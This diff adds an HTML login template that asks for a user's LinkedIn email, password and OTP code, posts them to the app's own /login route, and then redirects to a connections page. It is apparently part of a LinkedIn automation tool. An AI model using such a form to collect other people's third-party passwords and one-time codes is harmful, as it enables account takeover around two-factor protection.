@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>LinkedIn Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #1a1a1a 0%, #000000 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+        }
+
+        .login-container {
+            background: rgba(30, 30, 30, 0.85);
+            border-radius: 15px;
+            border: 2px solid #ff0000;
+            width: 400px;
+            padding: 40px;
+        }
+
+        .login-input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            background: rgba(20, 20, 20, 0.8);
+            border: 2px solid #ff0000;
+            color: white;
+            border-radius: 8px;
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 15px;
+            margin-top: 20px;
+            background: linear-gradient(45deg, #ff0000, #8B0000);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        #result {
+            margin-top: 20px;
+            text-align: center;
+            color: #ff0000;
+        }
+
+        .title {
+            color: #ff0000;
+            margin-bottom: 30px;
+            font-size: 2rem;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h2 class="title">LinkedIn Login</h2>
+        <form id="loginForm">
+            <input type="email" name="username" class="login-input" placeholder="LinkedIn Email" required>
+            <input type="password" name="password" class="login-input" placeholder="Password" required>
+            <input type="text" name="otp" class="login-input" placeholder="OTP Code">
+            <button type="submit" class="login-button">Login</button>
+        </form>
+        <div id="result"></div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const formData = new FormData(this);
+            
+            fetch('/login', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                const resultDiv = document.getElementById('result');
+                if (data.success) {
+                    resultDiv.textContent = 'Login successful!';
+                    setTimeout(() => {
+                        window.location.href = "{{ url_for('connections') }}";
+                    }, 1500);
+                } else {
+                    resultDiv.textContent = 'Login failed. Please check your credentials.';
+                }
+            })
+            .catch(error => {
+                document.getElementById('result').textContent = 'Error: ' + error;
+            });
+        });
+    </script>
+</body>
+</html>
